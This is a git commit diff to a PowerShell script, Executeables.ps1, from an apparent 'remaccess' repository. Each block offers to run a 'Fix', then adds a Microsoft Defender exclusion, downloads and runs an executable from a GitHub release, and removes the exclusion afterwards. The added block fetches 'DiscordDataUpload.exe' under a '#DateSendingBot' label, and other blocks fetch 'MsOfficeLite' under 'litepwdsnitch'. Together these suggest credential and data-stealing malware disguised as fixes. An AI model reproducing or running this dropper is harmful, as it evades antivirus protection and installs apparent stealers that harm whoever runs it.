05edddec8a33ced0f521272e8a9622e08f6803ae
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-21 20:33:46 +0500

    Update Executeables.ps1

--- Executeables.ps1
+++ Executeables.ps1
@@ -1,3 +1,22 @@
+#DateSendingBot
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
+}
+if ($pwdst.ToLower() -eq "y") {
+    Write-Host "Executing $Name Fix..."
+    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
+    	Add-MpPreference -ExclusionPath $exepath
+	Invoke-WebRequest -Uri $url -OutFile $exepath	
+	Start-Process -FilePath $exepath
+ 	if ($output -ne $null) {
+    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
+	} else {}
+	Remove-MpPreference -ExclusionPath $exepath
+} else {}
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
@@ -19,25 +38,6 @@ if ($pwdst.ToLower() -eq "y") {
 } else {}
 #classic-full-st Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeFull.exe"
-$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
-$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($pwdst.ToLower() -eq "y") {
-    Write-Host "Executing $Name Fix..."
-    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
-    	Add-MpPreference -ExclusionPath $exepath
-	Invoke-WebRequest -Uri $url -OutFile $exepath	
-	Start-Process -FilePath $exepath
- 	if ($output -ne $null) {
-    	Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
-	} else {}
-	Remove-MpPreference -ExclusionPath $exepath
-} else {}
-#classic-full-st Fix
-$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
 $pwdst = Read-Host "Proceed With $Name Fix (y/n)"
 if ([string]::IsNullOrEmpty($pwdst)) {
